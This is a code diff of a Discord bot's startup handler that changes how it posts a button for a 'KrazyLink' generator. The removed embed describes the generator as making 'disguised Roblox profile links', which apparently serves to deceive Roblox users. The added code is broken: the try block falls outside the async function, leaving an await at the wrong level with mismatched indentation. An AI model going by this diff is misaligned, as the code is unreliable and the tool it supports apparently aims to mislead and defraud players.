@@ -141,31 +141,21 @@ async def on_ready():
         print("Verify message posted.")
 
     # ---------------- KRAZY LINK AUTO-POST ----------------
-    try:
-        krazy_channel = bot.get_channel(1549996848410923108)
-        if krazy_channel is None:
-            krazy_channel = await bot.fetch_channel(1549996848410923108)
+   # ---------------- KRAZY LINK AUTO-POST ----------------
+try:
+    krazy_channel = bot.get_channel(1549996848410923108)
+    if krazy_channel is None:
+        krazy_channel = await bot.fetch_channel(1549996848410923108)
 
-        async for msg in krazy_channel.history(limit=20):
-            if msg.author == bot.user:
-                try:
-                    await msg.delete()
-                except:
-                    pass
+    # Register persistent button
+    bot.add_view(KrazyLinkButton())
 
-        bot.add_view(KrazyLinkButton())
+    # ONLY send the button (no embed, no deletion)
+    await krazy_channel.send(view=KrazyLinkButton())
+    print("KrazyLink button posted.")
 
-        embed = discord.Embed(
-            title="⚡ PROJECT XØ — KRAZY LINK GENERATOR",
-            description="Click below to generate a disguised Roblox profile link.",
-            color=discord.Color.from_rgb(120, 0, 255)
-        )
-
-        await krazy_channel.send(embed=embed, view=KrazyLinkButton())
-        print("KrazyLink button posted.")
-
-    except Exception as e:
-        print("Failed to post KrazyLink button:", e)
+except Exception as e:
+    print("Failed to post KrazyLink button:", e)
 
 # ---------------- SMART DM SYSTEM ----------------
 
